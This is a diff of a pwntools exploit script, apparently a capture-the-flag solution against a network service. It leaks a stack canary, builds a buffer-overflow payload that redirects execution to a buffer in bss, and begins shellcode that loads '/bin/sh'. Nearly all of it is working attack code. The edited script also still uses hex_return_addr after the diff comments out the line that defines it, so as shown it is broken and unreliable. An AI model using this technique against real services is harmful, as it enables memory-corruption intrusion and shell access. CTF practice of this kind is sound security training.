@@ -39,13 +39,14 @@ print(">>> rec1: ", z)
 canery = z.split(payloads)[1][1:8]
 hex_canery = hex(u64(canery.ljust(8, b'\x00')))
 # make 0xd15b28eda9583a to 0xd15b28eda9583a00
+canery =  b'\x00' + canery
 print(">>> canery", canery)
 print(">>> hex_canery", hex_canery)
 
-return_addr = z.split(payloads)[1][8:-1]
-hex_return_addr = hex(u64(return_addr.ljust(8, b'\x00')))
-print(">>> return_addr", return_addr)
-print(">>> hex_return_addr", hex_return_addr)
+# return_addr = z.split(payloads)[1][8:-1]
+# hex_return_addr = hex(u64(return_addr.ljust(8, b'\x00')))
+# print(">>> return_addr", return_addr)
+# print(">>> hex_return_addr", hex_return_addr)
 
 
 ######################################### nWhat's the room number?
@@ -65,22 +66,21 @@ print(">>> hex_return_addr", hex_return_addr)
 
 ######################################### nWhat's the customer's name?
 r.recvuntil(b'name? ')
-payloads = b'A' * 40 + b'\x00'
+payloads = b'A' * 40 
 
 msg = 0xd31e0       # 00000000000d31e0 <msg> in bss
 main = 0x8b07       # 8b07 <main+0xa0> (0x8a67 + 0xa0)
 msg_ptr = int(hex_return_addr, 16) - main + msg
 
-print(">>> send: ", payloads + canery + p64(msg_ptr))
+print(">>> send: ", payloads + canery + b'B' * 8 + p64(msg_ptr))
 
 # pause()
 
-r.send(payloads + canery + b'\x00' + canery + p64(msg_ptr))
+r.send(payloads + canery + b'B' * 8 + p64(msg_ptr))
 
-z = r.recvline()
-print("\n\n>>> rec3: ", z)
-# print(r.recv())
-# r.send("xxx")
+# z = r.recvline()
+# print("\n\n>>> rec3: ", z)
+
 
 codes = """
 mov rax, 0x68732f6e69622f
